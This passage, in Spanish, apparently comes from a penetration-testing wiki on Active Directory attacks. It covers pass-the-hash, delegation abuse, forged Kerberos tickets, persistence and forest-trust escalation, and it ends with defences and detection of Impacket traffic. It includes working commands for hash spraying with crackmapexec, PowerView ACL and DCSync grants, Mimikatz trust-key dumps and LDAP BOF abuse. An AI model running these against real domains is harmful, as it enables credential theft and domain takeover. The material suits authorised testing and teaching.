Necesitas usar alguna **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** puedes crear una nueva **sessionlogon** e **inyectar** ese **hash** dentro de **LSASS**, para que, cuando se realice cualquier **autenticación NTLM**, se **use ese hash**. La última opción es lo que hace mimikatz.\
[**Lee esta página para obtener más información.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque busca **usar el hash NTLM del usuario para solicitar tickets de Kerberos**, como alternativa al Pass The Hash común sobre el protocolo NTLM. Por lo tanto, esto puede ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado y solo se permite Kerberos** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban el ticket de autenticación de un usuario** en lugar de sus contraseñas o valores hash. Después, este ticket robado se usa para **suplantar al usuario**, obteniendo acceso no autorizado a recursos y servicios dentro de una red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si tienes el **hash** o la **contraseña** de un **administrado**r local, deberías intentar **iniciar sesión localmente** en otros **PCs** con él.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Ten en cuenta que esto es bastante **ruidoso** y **LAPS** lo **mitigaría**.

### Abuso de MSSQL y Trusted Links

Si un usuario tiene privilegios para **acceder a instancias MSSQL**, podría usarlas para **ejecutar comandos en el host MSSQL** (si se ejecuta como SA), **robar** el **hash** de NetNTLM o incluso realizar un **ataque de relay**.\
Si una instancia MSSQL tiene una relación de confianza mediante un enlace de base de datos con otra instancia, un usuario con privilegios sobre la base de datos enlazada podría **usar la relación de confianza para ejecutar consultas en la otra instancia**. Estas relaciones de confianza pueden encadenarse y eventualmente alcanzar una base de datos mal configurada donde el usuario pueda ejecutar comandos.\
**Los enlaces entre bases de datos funcionan incluso a través de relaciones de confianza entre forests.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de inventario/despliegue de IT

Las suites de inventario y despliegue de terceros suelen exponer rutas potentes hacia credenciales y ejecución de código. Consulta:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si encuentras cualquier objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás extraer de la memoria los TGTs de todos los usuarios que inicien sesión en el equipo.\
Por tanto, si un **Domain Admin inicia sesión en el equipo**, podrás extraer su TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation, incluso podrías **comprometer automáticamente un Print Server** (con suerte, será un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un usuario o equipo está autorizado para "Constrained Delegation", podrá **impersonar a cualquier usuario para acceder a determinados servicios de un equipo**.\
Por tanto, si **comprometes el hash** de este usuario/equipo, podrás **impersonar a cualquier usuario** (incluso domain admins) para acceder a determinados servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Tener privilegios **WRITE** sobre un objeto de Active Directory de un equipo remoto permite obtener ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de permisos/ACLs

El usuario comprometido podría tener algunos **privilegios interesantes sobre ciertos objetos del dominio** que te permitirían hacer **movimiento** lateral/**escalar** privilegios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso del servicio Printer Spooler

Descubrir un **servicio Spool escuchando** dentro del dominio puede **abusarse** para **obtener nuevas credenciales** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sesiones de terceros

Si **otros usuarios** **acceden** a la máquina **comprometida**, es posible **recopilar credenciales de la memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Normalmente, los usuarios accederán al sistema mediante RDP, así que aquí tienes cómo realizar un par de ataques sobre sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **contraseña del Administrator local** en equipos unidos al dominio, garantizando que sea **aleatoria**, única y que se **cambie** con frecuencia. Estas contraseñas se almacenan en Active Directory y el acceso se controla mediante ACLs únicamente para usuarios autorizados. Con permisos suficientes para acceder a estas contraseñas, es posible pivotar hacia otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Robo de certificados

**Recopilar certificados** de la máquina comprometida podría ser una forma de escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de Certificate Templates

Si se configuran **templates vulnerables**, es posible abusar de ellos para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Extracción de credenciales del dominio

Una vez que obtengas privilegios de **Domain Admin** o, mejor aún, de **Enterprise Admin**, puedes **extraer** la **base de datos del dominio**: _ntds.dit_.

[**Puedes encontrar más información sobre el ataque DCSync aquí**](dcsync.md).

[**Puedes encontrar más información sobre cómo robar NTDS.dit aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc como Persistence

Algunas de las técnicas mencionadas anteriormente pueden utilizarse para persistence.\
Por ejemplo, podrías:

- Hacer que los usuarios sean vulnerables a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Hacer que los usuarios sean vulnerables a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilegios de [**DCSync**](#dcsync) a un usuario

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

El **ataque Silver Ticket** crea un ticket **legítimo de Ticket Granting Service (TGS)** para un servicio específico utilizando el **hash NTLM** (por ejemplo, el **hash de la cuenta del PC**). Este método se utiliza para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **ataque Golden Ticket** implica que un atacante obtenga acceso al **hash NTLM de la cuenta krbtgt** en un entorno de Active Directory (AD). Esta cuenta es especial porque se utiliza para firmar todos los **Ticket Granting Tickets (TGTs)**, que son esenciales para autenticarse dentro de la red de AD.

Una vez que el atacante obtiene este hash, puede crear **TGTs** para cualquier cuenta que elija (ataque Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Son similares a los golden tickets, pero están forjados de una manera que **evade los mecanismos comunes de detección de golden tickets**.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence de cuentas mediante certificados**

**Tener certificados de una cuenta o poder solicitarlos** es una muy buena forma de mantener la persistence en la cuenta del usuario (incluso si cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence de dominio mediante certificados**

**El uso de certificados también permite mantener la persistence con privilegios elevados dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupo AdminSDHolder

El objeto **AdminSDHolder** de Active Directory garantiza la seguridad de los **grupos privilegiados** (como Domain Admins y Enterprise Admins) aplicando una **Access Control List (ACL)** estándar a estos grupos para evitar cambios no autorizados. Sin embargo, esta funcionalidad puede explotarse; si un atacante modifica la ACL de AdminSDHolder para otorgar acceso total a un usuario normal, dicho usuario obtiene un amplio control sobre todos los grupos privilegiados. Esta medida de seguridad, destinada a proteger, puede por tanto volverse en contra y permitir acceso no autorizado si no se supervisa de cerca.

[**Puedes encontrar más información sobre el grupo AdminDSHolder aquí.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciales DSRM

Dentro de cada **Domain Controller (DC)** existe una cuenta de **administrador local**. Al obtener derechos de administrador en una máquina de este tipo, el hash del Administrator local puede extraerse utilizando **mimikatz**. Después de esto, es necesaria una modificación del registro para **habilitar el uso de esta contraseña**, permitiendo el acceso remoto a la cuenta Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistence mediante ACLs

Podrías **conceder** algunos **permisos especiales** a un **usuario** sobre determinados objetos específicos del dominio, lo que permitiría al usuario **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Los **security descriptors** se utilizan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si puedes simplemente **realizar** un **pequeño cambio** en el **security descriptor** de un objeto, puedes obtener privilegios muy interesantes sobre dicho objeto sin necesidad de pertenecer a un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa de la clase auxiliar `dynamicObject` para crear principals/GPOs/registros DNS de corta duración con `entryTTL`/`msDS-Entry-Time-To-Die`; se eliminan automáticamente sin tombstones, borrando las evidencias LDAP mientras dejan SIDs huérfanos, referencias `gPLink` rotas o respuestas DNS almacenadas en caché (por ejemplo, contaminación de ACEs de AdminSDHolder o redirecciones maliciosas mediante `gPCFileSysPath`/DNS integrado en AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** en memoria para establecer una **contraseña universal**, otorgando acceso a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Aprende qué es un SSP (Security Support Provider) aquí.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto plano** las **credenciales** utilizadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en AD y lo utiliza para **introducir atributos** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **registro** sobre las **modificaciones**. **Necesitas privilegios DA** y estar dentro del **root domain**.\
Ten en cuenta que, si utilizas datos incorrectos, aparecerán registros bastante comprometedores.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistence mediante LAPS

Anteriormente hemos explicado cómo escalar privilegios si tienes **permisos suficientes para leer las contraseñas de LAPS**. Sin embargo, estas contraseñas también pueden utilizarse para **mantener la persistence**.\
Consulta:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera el **Forest** como el límite de seguridad. Esto implica que **comprometer un único dominio podría llevar potencialmente al compromiso de todo el Forest**.<sup>[[1]](#references)</sup>

### Información básica

Una [**relación de confianza de dominio**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **dominio** acceder a recursos de otro **dominio**. Básicamente, crea un vínculo entre los sistemas de autenticación de ambos dominios, permitiendo que las verificaciones de autenticación fluyan de forma transparente. Cuando los dominios establecen una relación de confianza, intercambian y conservan determinadas **claves** dentro de sus **Domain Controllers (DCs)**, que son esenciales para la integridad de la relación de confianza.

En un escenario típico, si un usuario quiere acceder a un servicio en un **dominio de confianza**, primero debe solicitar un ticket especial conocido como **inter-realm TGT** al DC de su propio dominio. Este TGT se cifra con una **clave** compartida que ambos dominios han acordado. A continuación, el usuario presenta este TGT al **DC del dominio de confianza** para obtener un ticket de servicio (**TGS**). Tras validar correctamente el inter-realm TGT, el DC del dominio de confianza emite un TGS que concede al usuario acceso al servicio.

**Pasos**:

1. Un **equipo cliente** en el **Domain 1** inicia el proceso utilizando su **hash NTLM** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. DC1 emite un nuevo TGT si el cliente se autentica correctamente.
3. El cliente solicita entonces un **inter-realm TGT** a DC1, necesario para acceder a recursos en el **Domain 2**.
4. El inter-realm TGT se cifra con una **trust key** compartida entre DC1 y DC2 como parte de la relación de confianza bidireccional entre dominios.
5. El cliente lleva el inter-realm TGT al **Domain Controller (DC2) del Domain 2**.
6. DC2 verifica el inter-realm TGT utilizando su trust key compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el servidor del Domain 2 al que el cliente quiere acceder.
7. Finalmente, el cliente presenta este TGS al servidor, que está cifrado con el hash de la cuenta del servidor, para obtener acceso al servicio del Domain 2.

### Diferentes relaciones de confianza

Es importante observar que **una relación de confianza puede ser unidireccional o bidireccional**. En las opciones bidireccionales, ambos dominios confían entre sí, pero en una relación de confianza **unidireccional**, uno de los dominios será el **trusted** y el otro el dominio **trusting**. En este último caso, **solo podrás acceder a recursos dentro del dominio trusting desde el dominio trusted**.

Si el Domain A confía en el Domain B, A es el dominio trusting y B es el trusted. Además, en el **Domain A**, esto sería una relación de confianza **Outbound**; y en el **Domain B**, una relación de confianza **Inbound**.

**Diferentes relaciones de confianza**

- **Parent-Child Trusts**: Es una configuración común dentro del mismo forest, donde un dominio hijo tiene automáticamente una relación de confianza transitiva y bidireccional con su dominio padre. Esto significa que las solicitudes de autenticación pueden fluir de forma transparente entre el padre y el hijo.
- **Cross-link Trusts**: Conocidas como "shortcut trusts", se establecen entre dominios hijo para acelerar los procesos de referral. En forests complejos, los referrals de autenticación normalmente deben subir hasta el forest root y después bajar hasta el dominio de destino. Al crear cross-links, se acorta el recorrido, lo que resulta especialmente beneficioso en entornos geográficamente distribuidos.
- **External Trusts**: Se establecen entre dominios diferentes y no relacionados, y son no transitivas por naturaleza. Según la [documentación de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), las external trusts son útiles para acceder a recursos de un dominio fuera del forest actual que no está conectado mediante una forest trust. La seguridad se refuerza mediante SID filtering con external trusts.
- **Tree-root Trusts**: Estas relaciones se establecen automáticamente entre el forest root domain y un nuevo tree root añadido. Aunque no son habituales, son importantes para añadir nuevos árboles de dominio a un forest, permitiéndoles mantener un nombre de dominio único y garantizando la transitividad bidireccional. Puedes encontrar más información en la [guía de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de relación es una relación de confianza transitiva y bidireccional entre dos forest root domains, que también aplica SID filtering para mejorar las medidas de seguridad.
- **MIT Trusts**: Estas relaciones se establecen con dominios Kerberos que no son Windows y cumplen con [RFC4120](https://tools.ietf.org/html/rfc4120). Las MIT trusts son algo más especializadas y están destinadas a entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema Windows.

#### Otras diferencias en las **relaciones de confianza**

- Una relación de confianza también puede ser **transitiva** (A confía en B, B confía en C, por tanto A confía en C) o **no transitiva**.
- Una relación de confianza puede configurarse como **bidireccional** (ambos confían entre sí) o **unidireccional** (solo uno confía en el otro).

### Attack Path

1. **Enumerar** las relaciones de confianza
2. Comprobar si algún **security principal** (usuario/grupo/equipo) tiene **acceso** a recursos del **otro dominio**, quizá mediante entradas ACE o por pertenecer a grupos del otro dominio. Busca **relaciones entre dominios** (probablemente la relación de confianza se creó para esto).
1. kerberoast podría ser otra opción en este caso.
3. **Comprometer** las **cuentas** que puedan **pivotar** entre dominios.

Los atacantes que podrían acceder a recursos de otro dominio disponen de tres mecanismos principales:

- **Membresía en grupos locales**: Los principals pueden añadirse a grupos locales de máquinas, como el grupo “Administrators” de un servidor, lo que les concede un control considerable sobre esa máquina.
- **Membresía en grupos de un dominio externo**: Los principals también pueden ser miembros de grupos dentro del dominio externo. Sin embargo, la eficacia de este método depende de la naturaleza de la relación de confianza y del alcance del grupo.
- **Access Control Lists (ACLs)**: Los principals pueden especificarse en una **ACL**, especialmente como entidades en **ACEs** dentro de una **DACL**, proporcionándoles acceso a recursos específicos. Para quienes quieran profundizar en el funcionamiento de ACLs, DACLs y ACEs, el whitepaper titulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” es un recurso inestimable.<sup>[[17]](#references)</sup>

### Buscar usuarios/grupos externos con permisos

Puedes consultar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar security principals externos en el dominio. Estos serán usuarios/grupos de **un dominio/forest externo**.

Puedes comprobarlo en **Bloodhound** o utilizando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalada de privilegios de Child a Parent en el forest
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Otras formas de enumerar las confianzas del dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Hay **2 trusted keys**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes obtener la que utiliza el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escala como Enterprise admin al dominio child/parent abusando del trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprender cómo se puede explotar el Configuration Naming Context (NC) es crucial. El Configuration NC sirve como repositorio central para los datos de configuración en todo un forest en entornos de Active Directory (AD). Estos datos se replican en cada Domain Controller (DC) dentro del forest, y los DCs writeable mantienen una copia writeable del Configuration NC. Para explotar esto, se deben tener privilegios de **SYSTEM en un DC**, preferiblemente un child DC.

**Vincular GPO al sitio del DC raíz**

El contenedor Sites del Configuration NC incluye información sobre los sitios de todos los equipos unidos al dominio dentro del forest de AD. Al operar con privilegios de SYSTEM en cualquier DC, los atacantes pueden vincular GPOs a los sitios de los DCs raíz. Esta acción puede comprometer el dominio raíz mediante la manipulación de las políticas aplicadas a estos sitios.

Para obtener información detallada, se puede consultar la investigación sobre [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Comprometer cualquier gMSA del forest**

Un vector de ataque consiste en atacar gMSAs privilegiadas dentro del dominio. La clave raíz de KDS, esencial para calcular las contraseñas de las gMSAs, se almacena dentro del Configuration NC. Con privilegios de SYSTEM en cualquier DC, es posible acceder a la clave raíz de KDS y calcular las contraseñas de cualquier gMSA en todo el forest.

Se puede encontrar un análisis detallado y una guía paso a paso en:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementario de MSA delegado (BadSuccessor – abusando de los atributos de migración):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Investigación externa adicional: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Ataque de cambio de Schema**

Este método requiere paciencia, esperando a que se creen nuevos objetos de AD privilegiados. Con privilegios de SYSTEM, un atacante puede modificar el AD Schema para otorgar a cualquier usuario control total sobre todas las clases. Esto podría permitir el acceso y control no autorizados sobre los objetos de AD creados recientemente.

Se puede obtener más información en [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA a EA con ADCS ESC5**

La vulnerabilidad ADCS ESC5 se dirige al control sobre los objetos de Public Key Infrastructure (PKI) para crear una certificate template que permita autenticarse como cualquier usuario dentro del forest. Como los objetos PKI se encuentran en el Configuration NC, comprometer un child DC writeable permite ejecutar ataques ESC5.

Se pueden consultar más detalles en [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> En escenarios sin ADCS, el atacante tiene la capacidad de configurar los componentes necesarios, como se explica en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Dominio de Forest externo - One-Way (Inbound) o bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
En este escenario, **tu dominio es de confianza** para uno externo, lo que te proporciona **permisos indeterminados** sobre él. Tendrás que encontrar **qué principals de tu dominio tienen qué acceso sobre el dominio externo** y luego intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio de bosque externo - Unidireccional (saliente)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
En este escenario, **tu dominio** está **confiando** algunos **privilegios** a un principal de **dominios diferentes**.

Sin embargo, cuando un **dominio es de confianza** para el dominio que confía, el dominio de confianza **crea un usuario** con un **nombre predecible** que utiliza como **contraseña la contraseña del dominio de confianza**. Esto significa que es posible **acceder a un usuario del dominio que confía para entrar en el dominio de confianza**, enumerarlo e intentar escalar más privilegios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el dominio de confianza es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** a la de la relación de confianza entre dominios, algo que no es muy común.

Otra forma de comprometer el dominio de confianza es esperar en una máquina a la que **un usuario del dominio de confianza pueda acceder** para iniciar sesión mediante **RDP**. Entonces, el atacante podría inyectar código en el proceso de la sesión RDP y **acceder desde allí al dominio de origen de la víctima**.\
Además, si la **víctima había montado su disco duro**, desde el proceso de la **sesión RDP** el atacante podría almacenar **backdoors** en la **carpeta de inicio del disco duro**. Esta técnica se denomina **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigación del abuso de las relaciones de confianza entre dominios

### **SID Filtering:**

- El riesgo de los ataques que aprovechan el atributo SID history entre forest trusts se mitiga mediante SID Filtering, que está activado de forma predeterminada en todos los trusts entre forests. Esto se basa en la suposición de que los trusts dentro de un forest son seguros, considerando el forest, y no el dominio, como el límite de seguridad, de acuerdo con la postura de Microsoft.
- Sin embargo, hay una excepción: SID filtering podría interrumpir aplicaciones y el acceso de los usuarios, lo que provoca que se desactive ocasionalmente.

### **Selective Authentication:**

- Para los trusts entre forests, utilizar Selective Authentication garantiza que los usuarios de los dos forests no se autentiquen automáticamente. En su lugar, se requieren permisos explícitos para que los usuarios accedan a dominios y servidores dentro del dominio o forest que confía.
- Es importante señalar que estas medidas no protegen contra la explotación del Writable Configuration Naming Context (NC) ni contra los ataques a la cuenta de confianza.

[**Más información sobre las relaciones de confianza entre dominios en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso de AD basado en LDAP desde implants on-host

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa las primitivas LDAP al estilo de bloodyAD como Beacon Object Files x64 que se ejecutan completamente dentro de un implant on-host (por ejemplo, Adaptix C2). Los operadores compilan el pack con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, cargan `ldap.axs` y, a continuación, ejecutan `ldap <subcommand>` desde el beacon. Todo el tráfico utiliza el contexto de seguridad del inicio de sesión actual sobre LDAP (389), con signing/sealing, o LDAPS (636), con confianza automática en el certificado, por lo que no se requieren proxies socks ni artefactos en disco.<sup>[[4]](#references)</sup>

### Enumeración LDAP desde el implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` y `get-groupmembers` resuelven nombres cortos/rutas OU en DNs completos y vuelcan los objetos correspondientes.
- `get-object`, `get-attribute` y `get-domaininfo` extraen atributos arbitrarios, incluidos descriptores de seguridad, además de los metadatos del forest/dominio desde `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` y `get-rbcd` exponen directamente desde LDAP candidatos para roasting, configuraciones de delegation y descriptores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` y `get-writable --detailed` analizan la DACL para enumerar trustees, derechos (GenericAll/WriteDACL/WriteOwner/escrituras de atributos) y herencia, proporcionando objetivos inmediatos para la escalada de privilegios mediante ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivas de escritura LDAP para escalación y persistencia

- Los BOF de creación de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador preparar nuevos principals o cuentas de equipo allí donde existan permisos sobre la OU. `add-groupmember`, `set-password`, `add-attribute` y `set-attribute` permiten secuestrar directamente los objetivos una vez encontrados permisos de escritura de propiedades.
- Los comandos centrados en ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` y `add-dcsync`, convierten WriteDACL/WriteOwner sobre cualquier objeto de AD en restablecimientos de contraseñas, control de pertenencia a grupos o privilegios de replicación DCSync, sin dejar artefactos de PowerShell/ADSI. Sus equivalentes `remove-*` limpian los ACE inyectados.

### Delegación, roasting y abuso de Kerberos

- `add-spn`/`set-spn` hacen que un usuario comprometido pueda ser objetivo de Kerberoast al instante; `add-asreproastable` (conmutador UAC) lo marca para AS-REP roasting sin modificar la contraseña.
- Las macros de delegación (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescriben `msDS-AllowedToDelegateTo`, los indicadores UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, habilitando rutas de ataque de delegación constrained/unconstrained/RBCD y eliminando la necesidad de PowerShell remoto o RSAT.

### Inyección de sidHistory, reubicación de OU y configuración de la superficie de ataque

- `add-sidhistory` inyecta SIDs privilegiados en el historial SID de un principal controlado (consulta [SID-History Injection](sid-history-injection.md)), proporcionando una herencia de acceso sigilosa completamente mediante LDAP/LDAPS.
- `move-object` cambia el DN/OU de equipos o usuarios, permitiendo a un atacante arrastrar activos a OUs donde ya existan permisos delegados antes de abusar de `set-password`, `add-groupmember` o `add-spn`.
- Los comandos de eliminación estrictamente acotados (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten revertir rápidamente los cambios después de que el operador recopile credenciales o establezca persistencia, minimizando la telemetría.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algunas defensas generales

[**Obtén más información sobre cómo proteger las credenciales aquí.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para la protección de credenciales**

- **Restricciones para Domain Admins**: Se recomienda que Domain Admins solo puedan iniciar sesión en Domain Controllers, evitando su uso en otros hosts.
- **Privilegios de las cuentas de servicio**: Los servicios no deben ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Limitación temporal de privilegios**: Para las tareas que requieran privilegios de DA, su duración debe limitarse. Esto puede lograrse mediante: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigación de LDAP relay**: Audita los Event IDs 2889/3074/3075 y, después, aplica LDAP signing y el channel binding de LDAPS en DCs/clientes para bloquear intentos de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a nivel de protocolo de la actividad de Impacket

Si quieres detectar tradecraft común de AD, **no dependas únicamente de artefactos controlados por el operador**, como binarios renombrados, nombres de servicios, archivos batch temporales o rutas de salida. Establece una línea base de cómo los clientes legítimos de Windows construyen el tráfico de [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC y WMI; después, busca **peculiaridades de implementación** que permanezcan incluso después de que el operador edite `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Candidatos independientes de alta confianza** (después de validarlos con tu propia línea base):
- DCE/RPC autenticado usando `auth_context_id = 79231 + ctx_id`
- Relleno de autenticación de DCE/RPC completado con `0xff`
- Bindings LDAP Kerberos que colocan un `AP-REQ` Kerberos sin modificaciones directamente en `mechToken` de SPNEGO
- Solicitudes de negociación SMB2/3 con valores `ClientGuid` que parecen ASCII
- `IWbemLevel1Login::NTLMLogin` de WMI usando el namespace no estándar `//./root/cimv2`
- Valores nonce de Kerberos hardcodeados
- **Mejor como características de correlación/puntuación**:
- Listas de etypes de Kerberos escasas o duplicadas, `PA-DATA` inusual/ausente u ordenación de etypes de TGS-REQ diferente de la de Windows nativo
- Mensajes NTLM Type 1 sin información de versión o mensajes Type 3 con nombres de host nulos
- NTLMSSP sin procesar transportado en DCE/RPC en lugar de SPNEGO, sin trailers de verificación de DCE/RPC o con incompatibilidades entre los OID de SPNEGO/Kerberos
